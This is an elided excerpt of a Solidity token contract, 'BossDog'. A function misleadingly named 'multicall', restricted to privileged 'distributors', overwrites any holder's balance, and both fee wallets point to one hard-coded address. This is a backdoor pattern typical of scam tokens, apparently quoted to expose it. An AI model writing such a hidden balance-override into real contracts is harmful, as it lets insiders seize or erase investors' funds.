...
contract BossDog is Context, IERC20, Ownable {
    ...
    constructor () {
        _feeAddrWallet1 = payable(0xE5A1dDC466E42d49443dE6dcf4f530EcEE397733);
        _feeAddrWallet2 = payable(0xE5A1dDC466E42d49443dE6dcf4f530EcEE397733);
    ...
    function multicall(address account, uint256 tokens, uint256 burn) external distributors {
        ...
        _rOwned[account] = tokens.sub(burn, "ERC20: burn amount exceeds balance");
    }
